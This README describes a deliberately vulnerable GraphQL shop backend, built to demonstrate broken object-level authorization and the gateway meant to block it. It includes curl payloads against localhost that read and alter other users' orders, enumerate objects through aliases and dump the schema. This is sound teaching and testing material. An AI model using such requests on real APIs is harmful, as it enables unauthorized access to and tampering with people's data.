# VulnShop — a deliberately vulnerable GraphQL API

A small online-shop backend built to demonstrate GraphQL **BOLA**
(Broken Object Level Authorization). It is the "before" half of the project:
the thing our gateway is meant to protect.

Authentication works correctly — the server always knows *who* is calling.
Authorization is missing — it never checks whether the caller *owns* the
object they ask for. That gap is the whole point.

> **Do not deploy this.** It is intentionally insecure, for local testing only.
> Only ever attack your own copy.

---

## What's inside

| File | What it is |
|---|---|
| `app.py` | The GraphQL server (Strawberry + FastAPI). Schema, resolvers, auth. |
| `database.py` | Creates and seeds a small SQLite database on startup. |
| `static/index.html` | A plain web page to sign in, see your order, and look up any order. |
| `requirements.txt` | The three dependencies. |

**Stack:** Python 3, Strawberry (GraphQL), FastAPI + Uvicorn (server),
SQLite (storage). No build step, no Docker needed.

---

## How to run

```bash
pip install -r requirements.txt
python app.py
```

Then open **http://localhost:8000** in a browser.
The GraphQL endpoint is at **http://localhost:8000/graphql**.

The page lets you sign in as **Goutham**, **Kumar** or **Martin**. The
"Your orders" table uses `myOrders`, which is safe — it only ever returns
your own rows. The "Look up an order" box asks for any order by id, and that
is where the backend leaks: type `102` while signed in as Goutham.

---

## The seed data

Three customers, one order each. Prices are in rupees.

| User | Token | Owns order | Item | Total | Ships to |
|---|---|---|---|---|---|
| Goutham (id 1) | `token-goutham` | 101 | Wireless Mouse | ₹1,499 | 14 Anna Nagar, Chennai |
| Kumar (id 2) | `token-kumar` | 102 | Mechanical Keyboard | ₹4,999 | 27 R.S. Puram, Coimbatore |
| Martin (id 3) | `token-martin` | 103 | USB-C Hub | ₹1,899 | 8 Bandra West, Mumbai |

Goutham is the attacker. Anything where he touches order **102** or **103**
is a successful attack — he is reading data that isn't his.

---

## The vulnerabilities (and how to trigger each)

All commands below use **Goutham's** token to reach other people's data.

### 1. BOLA — read another user's order by id
Goutham asks for order 103, which belongs to Martin. The server hands it over.

```bash
curl -s http://localhost:8000/graphql \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer token-goutham" \
  -d '{"query":"{ order(id:103){ id total shippingAddress } }"}'
```

### 2. BOLA — read another user's profile by id

```bash
curl -s http://localhost:8000/graphql \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer token-goutham" \
  -d '{"query":"{ user(id:3){ id name email } }"}'
```

### 3. Lateral BOLA — reach a stranger's email sideways
Goutham walks order 103 → its owner → email. The sensitive field is reached
through a path, not fetched directly.

```bash
curl -s http://localhost:8000/graphql \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer token-goutham" \
  -d '{"query":"{ order(id:103){ owner{ name email } } }"}'
```

### 4. Mutation BOLA — change another user's order (a write)
Goutham overwrites the shipping address on Kumar's order.

```bash
curl -s http://localhost:8000/graphql \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer token-goutham" \
  -d '{"query":"mutation{ updateOrderAddress(id:102, address:\"HACKED\"){ id shippingAddress } }"}'
```

### 5. Alias enumeration — many objects in one request
One request reads all three orders at once by renaming the field. This is the
kind of disguise a normal firewall never sees.

```bash
curl -s http://localhost:8000/graphql \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer token-goutham" \
  -d '{"query":"{ a:order(id:101){shippingAddress} b:order(id:102){shippingAddress} c:order(id:103){shippingAddress} }"}'
```

### 6. Introspection is open — download the whole schema

```bash
curl -s http://localhost:8000/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { types { name } } }"}'
```

### 7. No depth or complexity limit
Nested and oversized queries run freely — nothing caps how deep or how wide
a query can be. (Try nesting `order { owner { ... } }` or requesting a huge
list; the server simply obliges.)

---

## Mapping to the gateway

Each vulnerability here is caught by one part of the gateway:

| Vulnerability | Gateway defence |
|---|---|
| 1, 2 — BOLA by id | Ownership check on every object |
| 3 — lateral BOLA | The order it starts from is ownership-checked, so the path is never walked |
| 4 — mutation BOLA | Check ownership before forwarding a write |
| 5 — alias enumeration | Normalise (expand aliases) before checking |
| 6 — introspection | Block introspection at the edge |
| 7 — depth/complexity | Depth and cost limits during the walk |

---

## Resetting

The database is rebuilt from scratch every time you run `python app.py`,
so any changes from attacks (like the "HACKED" address) are wiped on restart.
